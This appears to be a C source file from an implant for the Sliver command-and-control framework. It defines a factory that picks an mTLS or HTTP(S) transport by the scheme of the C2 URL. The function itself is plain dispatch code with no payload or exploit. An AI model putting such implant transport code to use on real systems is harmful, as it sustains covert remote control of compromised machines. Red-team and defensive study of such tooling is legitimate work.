/* src/transport/channel.c - channel factory: picks an implementation by scheme.
 *
 * Keeping the dispatch here means modes/ never parses URLs and a new transport is
 * one branch plus one file.
 */
#include "sliver/channel.h"

#include <stdio.h>
#include <string.h>

#include "sliver/log.h"

int sliver_channel_dial(const char *c2_url, const char *host, uint16_t port,
                        const char *ca_pem, const char *cert_pem, const char *key_pem,
                        const char *age_private_key, const char *server_minisign_pubkey,
                        sliver_channel_t **out, char *err, size_t err_len) {
  if (out == NULL) {
    return -1;
  }
  *out = NULL;
  if (c2_url == NULL) {
    if (err != NULL && err_len != 0) {
      (void)snprintf(err, err_len, "%s", "no C2 URL");
    }
    return -1;
  }

  if (strncmp(c2_url, "mtls://", 7) == 0) {
    return sliver_channel_mtls_dial(host, port, ca_pem, cert_pem, key_pem,
                                    age_private_key, server_minisign_pubkey, out, err,
                                    err_len);
  }
  if (strncmp(c2_url, "http://", 7) == 0 || strncmp(c2_url, "https://", 8) == 0) {
    return sliver_channel_http_dial(c2_url, age_private_key, server_minisign_pubkey, out,
                                   err, err_len);
  }

  if (err != NULL && err_len != 0) {
    (void)snprintf(err, err_len, "unsupported transport in %s", c2_url);
  }
  return -1;
}
